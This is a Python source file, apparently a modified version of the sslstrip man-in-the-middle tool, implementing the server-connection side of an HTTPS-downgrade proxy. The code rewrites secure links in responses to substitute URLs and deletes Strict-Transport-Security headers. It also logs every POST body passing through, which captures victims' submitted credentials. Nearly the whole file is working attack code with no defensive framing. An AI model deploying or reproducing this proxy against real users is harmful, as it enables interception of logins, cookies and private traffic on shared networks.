# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlTypewww           = re.compile(r"https://www", re.IGNORECASE)
    urlwExplicitPort   = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlToken1 		  = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
#    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        elif (key.lower()== 'strict-transport-security'):
        	logging.log(self.getLogLevel(), "LEO Erasing Strict Transport Security....")
        else:
            self.client.setHeader(key, value)
            

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)
        #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )


        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        sustitucion = {}
        patchDict = self.urlMonitor.patchDict
        if len(patchDict)>0:
        	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
        	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
		
		iterator = re.finditer(ServerConnection.urlExpression, data)       
        for match in iterator:
            url = match.group()
			
            logging.debug("Found secure reference: " + url)
            nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
            logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
            sustitucion[url] = nuevaurl
            #data.replace(url,nuevaurl)
        
        #data = self.urlMonitor.DataReemplazo(data)
        if len(sustitucion)>0:
        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
        	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
        
        #logging.debug("LEO DEBUG received data:\n"+data)	
        #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
        #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
        #if data.find("http://w.face")!=-1:
        #	logging.debug("LEO DEBUG Found error in modifications")
        #	raw_input("Press Enter to continue")
        #return re.sub(ServerConnection.urlType, 'http://web.', data)
        return data


    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()


